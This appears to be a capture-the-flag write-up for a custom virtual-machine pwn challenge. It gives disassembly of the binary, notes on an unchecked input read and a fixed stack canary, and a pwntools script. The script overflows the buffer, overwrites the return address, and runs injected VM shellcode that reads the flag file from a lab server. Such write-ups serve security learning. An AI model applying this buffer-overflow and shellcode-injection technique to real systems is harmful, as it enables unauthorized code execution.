0x0076    6 0    3        0 push r3
0x0078    4 0    3        1 mov r3, r1
0x007a    4 0    2        0 mov r2, r0
0x007c    4 1    1        1 mov r1, 0x1
0x0081    4 1    0        2 mov r0, 0x2
0x0086    8 0    0        0 syscall r0
0x0088    7 0    3        0 pop r3
0x008a    7 0    2        0 pop r2
0x008c    7 0    1        0 pop r1
0x008e    7 0   13        0 pop pc

[write]
0x0090    6 0    0        0 push r0
0x0092    6 0    1        0 push r1
0x0094    4 0    1        0 mov r1, r0
0x0096   30 1   13       13 call [pc + 0xd]
0x009b    5 0    0        1 xchg r0, r1
0x009d   30 1   13  2097104 call [pc + 0x1fffd0]
0x00a2    7 0    1        0 pop r1
0x00a4    7 0    0        0 pop r0
0x00a6    7 0   13        0 pop pc

[strlen]
0x00a8    6 0    1        0 push r1
0x00aa    6 0    2        0 push r2
0x00ac   21 0    1        1 xor r1, r1
0x00ae   21 0    2        2 xor r2, r2
0x00b0    1 0    2        0 movb r2, [r0]
0x00b2   24 1    2        0 cmpb r2, 0x0
0x00b7   27 1   13        9 jz [pc + 0x9]
0x00bc   17 0    0        0 inc r0
0x00be   17 0    1        0 inc r1
0x00c0   29 1   13  2097131 jmp [pc + 0x1fffeb]
0x00c5    4 0    0        1 mov r0, r1
0x00c7    7 0    2        0 pop r2
0x00c9    7 0    1        0 pop r1
0x00cb    7 0   13        0 pop pc

[text]
0x00cd  name>
0x00d3  bye
```

Disassembler displays code's address, opcode, opers[0] and opers[1]. <br />
This is something you will find out later, for the sake of unity among the challenges, it needs like the first line. <br />
In main, put 0x12345 to r6, and check it before the end. It is same as canary. <br />
It writes 'name>' and reads input. Input buf's address is bp-0x3c. <br />
And then writes 'bye', checks canary, and program ends. <br />
At read input, it doesn't check input's size. <br />
We can cause bof and we know canary, so we can change RA of main. <br />

***

## Ex flow

1. We can overwrite RA. Also, NX is disabled, so we can have perm to exec code at stack. <br />
2. By checking Dockerfile and 'vm_name.py', filesystem already loads 'flag' file. <br />
3. There is syscall(1) which can open file and add to pipeline. <br />
4. After that, we can write flag file to memory, and read it from memory. <br />
5. buf's size is 0x3c, it is very compact. If we can reuse register, we must do. <br />
6. Only mov instruction and syscall needs, so we can define mov function which can more simply generate opcode. <br />
7. Becareful write to memory in order. <br />

***

## Ex code

```python
from pwn import *

context.log_level = 'debug'

def int_to_bytes(n):
    if n == 0:
        return b'\x00'
    else:
        return n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')

def write_memory(data):
    res = 0
    res |= (data & 0b1111111) << 16
    res |= (data & 0b11111110000000) >> 7
    res |= (data & 0b111111100000000000000) >> 6
    return res

def mov(regi_num, data):
    res  = b'\x12'
    res += int_to_bytes(0x10 * regi_num)
    res += int_to_bytes(write_memory(data))
    return res

r = remote('192.168.0.3', 8102)

canary = 0x12345
bp = 0xf5fe0 - 0x6
syscall = b'\x20\x00'
buf = bp - 0x200

buf1 = b'flag\x00'
buf1 += mov(1, bp-0x3c)
buf1 += mov(0, 1)
buf1 += syscall
buf1 += mov(1, 2)
buf1 += mov(2, buf)
buf1 += mov(3, 0xff)
buf1 += mov(0, 3)
buf1 += syscall
buf1 += mov(1, 1)
buf1 += mov(0, 2)
buf1 += syscall

payload = buf1 + b'A' * (0x39 - len(buf1))
payload += int_to_bytes(write_memory(canary))
payload += b'A' * 3
payload += int_to_bytes(write_memory(bp-0x37))

r.sendafter(b'>', payload)

r.interactive()
```